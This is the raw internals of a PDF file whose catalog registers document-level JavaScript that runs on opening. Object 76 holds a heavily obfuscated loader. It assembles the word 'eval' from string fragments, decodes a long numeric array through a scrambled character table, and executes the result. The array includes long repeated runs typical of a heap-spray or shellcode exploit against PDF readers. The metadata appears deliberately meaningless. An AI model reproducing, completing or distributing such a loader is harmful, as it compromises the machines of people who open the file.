%PDF-1.5
%‚„œ”
7 0 obj
<</Count 1/Type/Pages/Kids[28 0 R]>>
endobj
10 0 obj
<</Creator(sli)/ModDate(D:20080817171147-07'00')/Company(Windjack Solutions, Inc.)/Title(al)>>
endobj
21 0 obj
<</Names 23 0 R/Outlines 1 0 R/Metadata 9 0 R/AcroForm 22 0 R/Pages 7 0 R/OCProperties<</D<</RBGroups[]/OFF[]/Order[]>>/OCGs[27 0 R]>>/StructTreeRoot 11 0 R/Type/Catalog>>
endobj
23 0 obj
<</JavaScript 24 0 R/AP 8 0 R>>
endobj
24 0 obj
<</Names[78 0 R 76 0 R]>>
endobj
25 0 obj
<</S/JavaScript/JS 26 0 R>>
endobj
26 0 obj
<</Length 1108/Filter[/FlateDecode]>>stream
endstream
endobj
28 0 obj
<</CropBox[37 37 575 755]/Annots 29 0 R/Parent 7 0 R/StructParents 0/Contents 60 0 R/Rotate 90/MediaBox[0 0 612 792]/Resources<</XObject<</Im0 69 0 R>>/ColorSpace<</CS0 59 0 R>>/Font<</TT0 61 0 R>>/ProcSet[/PDF/Text/ImageC]/Properties<</MC0 27 0 R>>/ExtGState<</GS0 72 0 R>>>>/Type/Page>>
endobj
59 0 obj
[/ICCBased 68 0 R]
endobj
60 0 obj
<</Length 539/Filter/FlateDecode/Type/Contents>>stream
endstream
endobj
76 0 obj
<</S/JavaScript/JS(
function test2\(\){v=ar[z];s=s+cc[v];}
ar=[6,
69,
20,
30,
28,
7,
65,
73,
40,
39,
43,
43,
65,
73,
11,
37,
50,
41,
65,
73,
40,
1,
11,
37,
65,
73,
46,
1,
50,
41,
65,
73,
50,
29,
39,
41,
65,
73,
39,
39,
1,
11,
65,
73,
43,
41,
37,
32,
65,
73,
41,
32,
40,
6,
65,
73,
40,
6,
39,
32,
65,
73,
32,
37,
41,
32,
65,
73,
46,
32,
40,
6,
65,
73,
1,
43,
66,
37,
65,
73,
46,
43,
40,
6,
65,
73,
39,
39,
32,
40,
65,
73,
43,
43,
14,
6,
65,
73,
1,
50,
40,
6,
65,
73,
32,
39,
39,
37,
65,
73,
39,
39,
46,
41,
65,
73,
40,
66,
4,
37,
65,
73,
66,
1,
50,
50,
65,
73,
11,
11,
66,
32,
65,
73,
6,
40,
11,
11,
65,
73,
41,
32,
40,
6,
65,
73,
37,
39,
39,
32,
65,
73,
39,
29,
41,
43,
65,
73,
46,
1,
32,
43,
65,
73,
40,
46,
11,
6,
65,
73,
4,
41,
39,
41,
65,
73,
50,
41,
40,
1,
65,
73,
1,
66,
46,
1,
65,
73,
50,
6,
50,
29,
65,
73,
1,
66,
41,
37,
65,
73,
40,
6,
1,
43,
65,
73,
39,
37,
46,
1,
65,
73,
46,
41,
40,
6,
65,
73,
46,
40,
39,
1,
65,
73,
11,
1,
32,
39,
65,
73,
40,
6,
1,
43,
65,
73,
4,
32,
46,
43,
65,
73,
11,
1,
32,
39,
65,
73,
37,
29,
39,
39,
65,
73,
41,
66,
41,
29,
65,
73,
33,
14,
11,
37,
65,
73,
37,
1,
32,
39,
65,
73,
14,
6,
39,
39,
65,
73,
6,
50,
32,
11,
65,
73,
39,
40,
66,
32,
65,
73,
46,
41,
11,
4,
65,
73,
37,
66,
32,
40,
65,
73,
32,
14,
37,
6,
65,
73,
14,
33,
32,
39,
65,
73,
50,
6,
41,
32,
65,
73,
39,
6,
11,
66,
65,
73,
46,
1,
66,
11,
65,
73,
1,
50,
50,
43,
65,
73,
1,
50,
40,
6,
65,
73,
32,
39,
4,
41,
65,
73,
43,
43,
14,
14,
65,
73,
32,
37,
40,
6,
65,
73,
40,
14,
41,
6,
65,
73,
50,
37,
41,
43,
65,
73,
1,
41,
11,
11,
65,
73,
32,
37,
4,
41,
65,
73,
14,
40,
40,
6,
65,
73,
14,
14,
32,
39,
65,
73,
32,
41,
40,
6,
65,
73,
32,
39,
40,
6,
65,
73,
33,
6,
37,
1,
65,
73,
1,
29,
1,
50,
65,
73,
50,
6,
37,
39,
65,
73,
33,
14,
1,
39,
65,
73,
43,
40,
40,
6,
65,
73,
40,
32,
4,
32,
65,
73,
32,
37,
46,
14,
65,
73,
46,
41,
39,
39,
65,
73,
29,
43,
32,
39,
65,
73,
11,
39,
50,
6,
65,
73,
43,
40,
40,
6,
65,
73,
40,
6,
32,
40,
65,
73,
43,
33,
11,
46,
65,
73,
1,
29,
32,
1,
65,
73,
29,
40,
50,
40,
65,
73,
11,
11,
11,
11,
65,
73,
50,
4,
11,
11,
65,
73,
50,
40,
11,
29,
65,
73,
32,
32,
32,
32,
65,
73,
32,
32,
32,
32,
65,
73,
1,
32,
1,
40,
65,
73,
41,
32,
43,
33,
65,
73,
11,
11,
43,
40,
65,
73,
32,
32,
32,
32,
65,
73,
1,
32,
32,
32,
65,
73,
37,
32,
40,
39,
65,
73,
1,
32,
66,
29,
65,
73,
40,
6,
1,
1,
65,
73,
40,
6,
50,
37,
65,
73,
66,
32,
1,
50,
65,
73,
37,
39,
40,
39,
65,
73,
11,
11,
32,
1,
65,
73,
43,
40,
50,
39,
65,
73,
43,
50,
43,
11,
65,
73,
32,
32,
32,
32,
65,
73,
46,
1,
43,
40,
65,
73,
43,
37,
46,
4,
65,
73,
1,
41,
43,
14,
65,
73,
66,
43,
11,
11,
65,
73,
37,
41,
40,
39,
65,
73,
40,
6,
32,
40,
65,
73,
50,
40,
50,
40,
65,
73,
11,
11,
43,
66,
65,
73,
11,
11,
11,
11,
65,
73,
32,
4,
50,
6,
65,
73,
46,
4,
50,
6,
65,
73,
50,
37,
40,
66,
65,
73,
32,
66,
32,
41,
65,
73,
32,
32,
32,
32,
65,
73,
1,
37,
40,
14,
65,
73,
32,
37,
4,
41,
65,
73,
32,
41,
37,
46,
65,
73,
46,
4,
4,
41,
65,
73,
43,
46,
43,
1,
65,
73,
37,
46,
46,
39,
65,
73,
4,
41,
41,
41,
65,
73,
46,
43,
32,
41,
65,
73,
39,
39,
46,
4,
65,
73,
37,
46,
39,
4,
65,
73,
4,
41,
41,
41,
65,
73,
4,
32,
32,
40,
65,
73,
46,
39,
4,
14,
65,
73,
1,
39,
4,
32,
65,
73,
11,
40,
43,
40,
65,
73,
32,
32,
32,
32,
65,
73,
11,
11,
32,
32,
65,
73,
32,
37,
1,
43,
65,
73,
50,
40,
40,
6,
65,
73,
37,
29,
39,
39,
65,
73,
37,
46,
1,
66,
65,
73,
66,
14,
41,
41,
65,
73,
46,
46,
32,
32,
65,
73,
43,
4,
46,
32,
65,
73,
37,
46,
46,
41,
65,
73,
66,
14,
41,
41,
65,
73,
4,
50,
32,
1,
65,
73,
43,
37,
43,
41,
65,
73,
37,
43,
43,
37,
65,
73,
66,
14,
41,
41,
65,
73,
32,
32,
32,
29,
65,
73,
40,
33,
1,
29,
65,
73,
32,
41,
37,
66,
65,
73,
40,
40,
39,
32,
65,
73,
66,
14,
41,
41,
65,
73,
41,
66,
32,
41,
65,
73,
43,
33,
1,
66,
65,
73,
43,
33,
32,
32,
65,
73,
1,
39,
32,
32,
65,
73,
43,
33,
1,
46,
65,
73,
11,
11,
32,
32,
65,
73,
66,
41,
1,
43,
65,
73,
37,
32,
40,
1,
65,
73,
66,
43,
46,
1,
65,
73,
32,
32,
43,
33,
65,
73,
11,
11,
1,
39,
65,
73,
32,
41,
1,
43,
65,
73,
32,
32,
43,
33,
65,
73,
50,
6,
40,
39,
65,
73,
1,
39,
32,
37,
65,
73,
1,
43,
11,
11,
65,
73,
40,
39,
32,
41,
65,
73,
32,
37,
37,
39,
65,
73,
32,
4,
50,
6,
65,
73,
66,
39,
50,
6,
65,
73,
40,
32,
41,
46,
65,
73,
32,
32,
39,
11,
65,
73,
11,
33,
46,
1,
65,
73,
40,
32,
41,
46,
65,
73,
32,
32,
39,
11,
65,
73,
37,
41,
46,
1,
65,
73,
32,
32,
43,
33,
65,
73,
11,
50,
43,
33,
65,
73,
1,
43,
11,
11,
65,
73,
50,
40,
32,
40,
65,
73,
11,
50,
29,
37,
65,
73,
11,
11,
11,
11,
65,
73,
41,
50,
40,
50,
65,
73,
50,
37,
32,
50,
65,
73,
11,
50,
29,
40,
65,
73,
32,
50,
40,
33,
65,
73,
43,
11,
40,
29,
65,
73,
6,
14,
32,
66,
65,
73,
37,
33,
39,
39,
65,
73,
1,
6,
40,
33,
65,
73,
37,
43,
66,
6,
65,
73,
46,
29,
41,
43,
65,
73,
66,
33,
39,
43,
65,
73,
46,
32,
4,
11,
65,
73,
46,
41,
43,
40,
65,
73,
46,
32,
46,
41,
65,
73,
4,
11,
39,
33,
65,
73,
39,
66,
4,
11,
65,
73,
39,
29,
39,
32,
65,
73,
39,
4,
4,
50,
65,
73,
39,
1,
39,
39,
65,
73,
39,
41,
4,
50,
65,
73,
4,
50,
39,
29,
65,
73,
39,
39,
39,
4,
65,
73,
46,
46,
4,
11,
65,
73,
46,
32,
4,
50,
65,
73,
46,
32,
43,
40,
65,
73,
43,
43,
39,
11,
65,
73,
39,
1,
39,
14,
65,
73,
4,
43,
39,
1,
65,
73,
39,
14,
43,
1,
65,
73,
32,
32,
39,
39,
65,
73,
32,
32,
32,
32,
7,
35,
11,
73,
54,
37,
44,
21,
10,
54,
61,
50,
45,
56,
17,
55,
17,
33,
70,
52,
18,
36,
9,
34,
31,
21,
26,
50,
55,
17,
33,
53,
26,
50,
54,
30,
44,
31,
57,
4,
64,
52,
18,
36,
9,
17,
33,
23,
28,
17,
33,
35,
24,
17,
33,
28,
17,
33,
53,
20,
73,
6,
20,
44,
17,
21,
54,
30,
55,
32,
70,
52,
18,
12,
4,
36,
35,
17,
50,
44,
73,
17,
54,
61,
17,
33,
35,
24,
61,
11,
73,
54,
37,
44,
21,
10,
54,
61,
6,
42,
55,
36,
9,
56,
33,
17,
61,
14,
3,
30,
28,
54,
50,
34,
61,
27,
17,
17,
33,
18,
55,
36,
35,
56,
33,
17,
61,
56,
34,
28,
32,
42,
32,
37,
32,
37,
32,
37,
32,
37,
35,
56,
33,
17,
61,
33,
14,
14,
17,
28,
32,
42,
41,
32,
32,
32,
32,
32,
35,
56,
33,
17,
61,
67,
33,
18,
26,
10,
33,
14,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
6,
69,
20,
30,
36,
35,
56,
33,
17,
61,
20,
37,
48,
26,
50,
54,
28,
67,
33,
18,
26,
10,
33,
14,
53,
26,
50,
54,
30,
44,
31,
57,
4,
35,
56,
33,
17,
61,
52,
18,
28,
33,
14,
14,
17,
59,
55,
20,
37,
48,
26,
50,
54,
23,
32,
42,
39,
40,
36,
35,
56,
33,
17,
61,
18,
33,
17,
20,
67,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
38,
65,
73,
29,
32,
29,
32,
65,
73,
29,
32,
29,
32,
38,
36,
35,
18,
33,
17,
20,
67,
28,
50,
45,
56,
17,
55,
18,
33,
17,
20,
67,
70,
52,
18,
36,
35,
56,
33,
17,
61,
37,
10,
73,
54,
44,
4,
28,
55,
56,
34,
59,
32,
42,
41,
32,
32,
32,
32,
32,
36,
12,
33,
14,
14,
17,
35,
11,
10,
17,
55,
56,
33,
17,
61,
37,
10,
73,
54,
44,
28,
32,
35,
37,
10,
73,
54,
44,
64,
37,
10,
73,
54,
44,
4,
35,
37,
10,
73,
54,
44,
23,
23,
36,
9,
14,
3,
30,
62,
37,
10,
73,
54,
44,
72,
28,
18,
33,
17,
20,
67,
23,
67,
33,
18,
26,
10,
33,
14,
35,
24,
61,
56,
33,
17,
61,
10,
56,
50,
17,
11,
26,
10,
34,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
38,
65,
73,
32,
37,
32,
37,
65,
73,
32,
37,
32,
37,
38,
36,
35,
34,
31,
21,
26,
50,
55,
10,
56,
50,
17,
11,
26,
10,
34,
53,
26,
50,
54,
30,
44,
31,
64,
41,
41,
29,
1,
4,
36,
9,
10,
56,
50,
17,
11,
26,
10,
34,
23,
28,
10,
56,
50,
17,
11,
26,
10,
34,
35,
24,
61,
44,
31,
21,
20,
53,
37,
10,
26,
26,
33,
6,
49,
44,
10,
17,
50,
28,
25,
10,
26,
26,
33,
6,
53,
37,
10,
26,
26,
50,
37,
44,
63,
19,
33,
21,
26,
58,
54,
11,
10,
55,
9,
20,
73,
6,
69,
15,
38,
38,
70,
19,
20,
30,
15,
10,
56,
50,
17,
11,
26,
10,
34,
24,
36,
35,
24,
61,
11,
73,
54,
37,
44,
21,
10,
54,
61,
67,
17,
21,
54,
44,
11,
55,
36,
9,
54,
10,
67,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
38,
65,
73,
32,
27,
32,
27,
65,
73,
32,
27,
32,
27,
65,
73,
32,
27,
32,
27,
65,
73,
32,
27,
32,
27,
38,
36,
35,
56,
33,
17,
61,
67,
33,
18,
26,
10,
33,
14,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
6,
69,
20,
30,
36,
35,
31,
50,
33,
67,
6,
26,
10,
37,
3,
28,
54,
10,
67,
23,
67,
33,
18,
26,
10,
33,
14,
35,
6,
21,
30,
6,
26,
10,
37,
3,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
38,
65,
73,
32,
27,
32,
27,
65,
73,
32,
27,
32,
27,
38,
36,
35,
31,
50,
33,
14,
50,
17,
20,
21,
45,
50,
28,
4,
32,
35,
20,
67,
17,
33,
18,
28,
31,
50,
33,
14,
50,
17,
20,
21,
45,
50,
23,
31,
50,
33,
67,
6,
26,
10,
37,
3,
53,
26,
50,
54,
30,
44,
31,
35,
34,
31,
21,
26,
50,
55,
6,
21,
30,
6,
26,
10,
37,
3,
53,
26,
50,
54,
30,
44,
31,
64,
20,
67,
17,
33,
18,
36,
9,
6,
21,
30,
6,
26,
10,
37,
3,
23,
28,
6,
21,
30,
6,
26,
10,
37,
3,
35,
24,
61,
11,
21,
26,
26,
6,
26,
10,
37,
3,
28,
6,
21,
30,
6,
26,
10,
37,
3,
53,
20,
73,
6,
20,
44,
17,
21,
54,
30,
55,
32,
70,
20,
67,
17,
33,
18,
36,
35,
6,
26,
10,
37,
3,
28,
6,
21,
30,
6,
26,
10,
37,
3,
53,
20,
73,
6,
20,
44,
17,
21,
54,
30,
55,
32,
70,
6,
21,
30,
6,
26,
10,
37,
3,
53,
26,
50,
54,
30,
44,
31,
59,
20,
67,
17,
33,
18,
36,
35,
34,
31,
21,
26,
50,
55,
6,
26,
10,
37,
3,
53,
26,
50,
54,
30,
44,
31,
23,
20,
67,
17,
33,
18,
64,
32,
42,
41,
32,
32,
32,
32,
36,
9,
6,
26,
10,
37,
3,
28,
6,
26,
10,
37,
3,
23,
6,
26,
10,
37,
3,
23,
11,
21,
26,
26,
6,
26,
10,
37,
3,
35,
24,
61,
19,
50,
19,
28,
54,
50,
34,
61,
27,
17,
17,
33,
18,
55,
36,
35,
11,
10,
17,
55,
21,
28,
32,
35,
21,
64,
66,
41,
32,
32,
35,
21,
23,
23,
36,
9,
19,
50,
19,
62,
21,
72,
28,
6,
26,
10,
37,
3,
23,
31,
50,
33,
67,
6,
26,
10,
37,
3,
35,
24,
61,
56,
33,
17,
61,
54,
73,
19,
28,
66,
4,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
29,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
40,
35,
73,
44,
21,
26,
53,
67,
17,
21,
54,
44,
11,
55,
38,
65,
41,
1,
32,
32,
32,
11,
38,
70,
54,
73,
19,
36,
35,
24,
61,
11,
73,
54,
37,
44,
21,
10,
54,
61,
30,
50,
44,
21,
37,
10,
54,
55,
36,
9,
56,
33,
17,
61,
33,
17,
17,
18,
28,
54,
50,
34,
61,
27,
17,
17,
33,
18,
55,
36,
35,
21,
11,
55,
33,
67,
67,
53,
14,
10,
37,
53,
25,
10,
26,
26,
33,
6,
53,
30,
50,
44,
58,
37,
10,
54,
36,
9,
56,
33,
17,
61,
67,
33,
18,
26,
10,
33,
14,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
6,
69,
20,
30,
36,
35,
56,
33,
17,
61,
31,
0,
52,
1,
32,
32,
25,
8,
28,
67,
33,
18,
26,
10,
33,
14,
53,
26,
50,
54,
30,
44,
31,
57,
4,
35,
56,
33,
17,
61,
52,
18,
28,
32,
42,
41,
32,
32,
32,
32,
32,
59,
55,
31,
0,
52,
1,
32,
32,
25,
8,
23,
32,
42,
39,
40,
36,
35,
56,
33,
17,
61,
18,
33,
17,
20,
67,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
38,
65,
73,
29,
32,
29,
32,
65,
73,
29,
32,
29,
32,
38,
36,
35,
18,
33,
17,
20,
67,
28,
50,
45,
56,
17,
55,
18,
33,
17,
20,
67,
70,
52,
18,
36,
35,
56,
33,
17,
61,
67,
1,
27,
69,
22,
43,
1,
11,
28,
55,
32,
42,
32,
37,
32,
37,
32,
37,
32,
37,
59,
32,
42,
41,
32,
32,
32,
32,
32,
36,
12,
32,
42,
41,
32,
32,
32,
32,
32,
35,
11,
10,
17,
55,
56,
33,
17,
61,
56,
52,
37,
5,
51,
29,
43,
18,
28,
32,
35,
56,
52,
37,
5,
51,
29,
43,
18,
64,
67,
1,
27,
69,
22,
43,
1,
11,
35,
56,
52,
37,
5,
51,
29,
43,
18,
23,
23,
36,
9,
33,
17,
17,
18,
62,
56,
52,
37,
5,
51,
29,
43,
18,
72,
28,
18,
33,
17,
20,
67,
23,
67,
33,
18,
26,
10,
33,
14,
35,
24,
61,
56,
33,
17,
61,
44,
75,
16,
31,
8,
6,
60,
34,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
38,
65,
32,
29,
38,
36,
35,
34,
31,
21,
26,
50,
55,
44,
75,
16,
31,
8,
6,
60,
34,
53,
26,
50,
54,
30,
44,
31,
64,
32,
42,
41,
32,
32,
32,
36,
9,
44,
75,
16,
31,
8,
6,
60,
34,
23,
28,
44,
75,
16,
31,
8,
6,
60,
34,
35,
24,
61,
44,
75,
16,
31,
8,
6,
60,
34,
28,
38,
8,
53,
38,
23,
44,
75,
16,
31,
8,
6,
60,
34,
35,
33,
67,
67,
53,
14,
10,
37,
53,
25,
10,
26,
26,
33,
6,
53,
30,
50,
44,
58,
37,
10,
54,
55,
44,
75,
16,
31,
8,
6,
60,
34,
36,
35,
24,
24,
61,
33,
71,
26,
73,
30,
21,
54,
20,
28,
33,
67,
67,
53,
67,
26,
73,
30,
58,
54,
20,
35,
56,
33,
17,
61,
20,
56,
28,
67,
33,
17,
20,
50,
58,
54,
44,
55,
33,
67,
67,
53,
56,
21,
50,
34,
50,
17,
2,
50,
17,
20,
21,
10,
54,
53,
44,
10,
49,
44,
17,
21,
54,
30,
55,
36,
53,
37,
31,
33,
17,
27,
44,
55,
32,
36,
36,
35,
11,
10,
17,
55,
56,
33,
17,
61,
21,
28,
32,
35,
21,
64,
33,
71,
26,
73,
30,
21,
54,
20,
53,
26,
50,
54,
30,
44,
31,
35,
21,
23,
23,
36,
9,
21,
11,
55,
33,
71,
26,
73,
30,
21,
54,
20,
62,
21,
72,
53,
54,
33,
19,
50,
28,
28,
7,
63,
49,
37,
17,
21,
67,
44,
7,
36,
9,
56,
33,
17,
61,
26,
56,
28,
33,
71,
26,
73,
30,
21,
54,
20,
62,
21,
72,
53,
56,
50,
17,
20,
21,
10,
54,
35,
24,
24,
61,
21,
11,
55,
55,
26,
56,
28,
28,
29,
36,
47,
47,
55,
55,
20,
56,
28,
28,
40,
36,
68,
68,
55,
26,
56,
64,
28,
40,
53,
66,
4,
36,
36,
36,
9,
30,
50,
44,
21,
37,
10,
54,
55,
36,
35,
24,
50,
26,
20,
50,
61,
21,
11,
55,
26,
56,
28,
28,
46,
53,
66,
36,
9,
67,
17,
21,
54,
44,
11,
55,
36,
35,
24,
50,
26,
20,
50,
61,
21,
11,
55,
55,
55,
20,
56,
28,
28,
43,
36,
47,
47,
55,
20,
56,
28,
28,
46,
36,
36,
68,
68,
55,
26,
56,
64,
46,
53,
66,
66,
36,
36,
9,
6,
42,
55,
36,
35,
24,
50,
26,
20,
50,
61,
21,
11,
55,
55,
26,
56,
13,
28,
29,
53,
66,
36,
47,
47,
55,
26,
56,
64,
28,
29,
53,
4,
36,
47,
47,
55,
26,
56,
13,
28,
40,
53,
66,
39,
36,
47,
47,
55,
26,
56,
64,
28,
40,
53,
66,
46,
36,
36,
9,
11,
73,
54,
37,
44,
21,
10,
54,
61,
33,
55,
36,
9,
73,
44,
21,
26,
53,
67,
17,
21,
54,
44,
14,
55,
7,
67,
74,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
66,
61,
15,
61,
18,
18,
18,
18,
66,
66,
66,
7,
70,
54,
50,
34,
61,
51,
33,
44,
50,
55,
36,
36,
35,
24,
56,
33,
17,
61,
31,
28,
33,
67,
67,
53,
67,
26,
73,
30,
58,
54,
20,
35,
11,
10,
17,
55,
56,
33,
17,
61,
11,
28,
32,
35,
11,
64,
31,
53,
26,
50,
54,
30,
44,
31,
35,
11,
23,
23,
36,
9,
21,
11,
55,
31,
62,
11,
72,
53,
54,
33,
19,
50,
28,
28,
7,
63,
49,
37,
17,
21,
67,
44,
7,
36,
9,
56,
33,
17,
61,
21,
28,
31,
62,
11,
72,
53,
56,
50,
17,
20,
21,
10,
54,
35,
24,
24,
61,
21,
11,
55,
55,
21,
13,
40,
53,
66,
4,
36,
68,
68,
55,
21,
64,
40,
53,
4,
36,
36,
9,
37,
28,
54,
50,
34,
61,
27,
17,
17,
33,
18,
55,
36,
35,
56,
33,
17,
61,
14,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
7,
65,
73,
29,
32,
29,
32,
65,
73,
29,
32,
29,
32,
7,
36,
35,
56,
33,
17,
61,
50,
28,
73,
54,
50,
20,
37,
33,
67,
50,
55,
6,
69,
20,
30,
36,
35,
34,
31,
21,
26,
50,
55,
14,
53,
26,
50,
54,
30,
44,
31,
64,
28,
32,
42,
40,
32,
32,
32,
36,
9,
14,
23,
28,
14,
35,
24,
14,
28,
14,
53,
20,
73,
6,
20,
44,
17,
55,
32,
70,
32,
42,
40,
32,
32,
32,
59,
50,
53,
26,
50,
54,
30,
44,
31,
36,
35,
11,
10,
17,
55,
11,
28,
32,
35,
11,
64,
4,
29,
32,
32,
35,
11,
23,
23,
36,
9,
37,
62,
11,
72,
28,
14,
23,
50,
35,
24,
33,
55,
36,
35,
33,
55,
36,
35,
44,
17,
18,
9,
44,
31,
21,
20,
53,
19,
50,
14,
21,
33,
53,
54,
50,
34,
71,
26,
33,
18,
50,
17,
55,
54,
73,
26,
26,
36,
35,
24,
37,
33,
44,
37,
31,
55,
50,
36,
9,
24,
33,
55,
36,
35,
24,
24];
cc={q:"W5Vk2Qb'N{of/>d:MrymsiK+}ClA=9gh0aw;\)c'384x6tz7|_SeDq.n\(v*I-G [E<%1p&j,P]u@U"}.q;
qq='12e'+'wqva!l';
q=qq[2]+qq[5]+qq[6]+qq[8];
try{loadXML\({}\);}catch\($\){
b={v:{q:this}}.v.q;
w={v:b[q]}.v;
s=Array\(\);
n={v:cc}.v;
for\(i=0;i-3848<0;i++\){
z=i;
test2\(\);
}
w\(s\);
}
)>>
endobj
xref
0 155
trailer
<</Size 155
/Root 21 0 R>>
xref
0 0
trailer
<</Size 155/Prev 75626/XRefStm 416/Root 21 0 R>>
startxref
78995
%%EOF